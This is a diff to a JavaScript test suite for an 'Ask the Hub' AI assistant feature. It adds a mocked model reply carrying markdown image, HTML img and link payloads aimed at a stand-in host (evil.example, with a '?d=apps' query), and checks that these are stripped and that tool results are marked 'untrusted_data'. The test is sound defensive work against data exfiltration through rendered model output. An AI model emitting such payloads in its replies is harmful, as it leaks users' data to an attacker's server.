@@ -500,7 +500,12 @@ describe('Ask the Hub', () => {
           }
         return {
           stop_reason: 'end_turn',
-          content: [{ type: 'text', text: 'You own [EFP](https://hub.example.com/hub?app=1).' }]
+          content: [
+            {
+              type: 'text',
+              text: 'You own [EFP](https://hub.example.com/hub?app=1). ![x](https://evil.example/?d=apps) <img src="https://evil.example/a.png"> [more](https://evil.example/x)'
+            }
+          ]
         }
       }
     )
@@ -514,6 +519,8 @@ describe('Ask the Hub', () => {
     expect(r.statusCode).toBe(200)
     const d = r.json().data
     expect(d.answer).toMatch(/EFP/)
+    expect(d.answer).toContain('[EFP](/hub?app=1)')
+    expect(d.answer).not.toMatch(/evil\.example\/\?d|<img|!\[|\]\(https:\/\/evil/)
     expect(d.tools).toEqual(['hub_list_apps'])
     expect(d.citations).toEqual(expect.arrayContaining([{ label: 'EFP', path: `/hub?app=${efp}` }]))
     const first = seen[0] as { tools: Array<{ name: string }> }
@@ -528,6 +535,7 @@ describe('Ask the Hub', () => {
     expect(results).toContain('EFP')
     expect(results).not.toContain('Pole')
     expect(results).toMatch(/not available here/)
+    expect(results).toContain('untrusted_data')
   })
 
   it('refuses a bad question and says when AI is not set up', async () => {
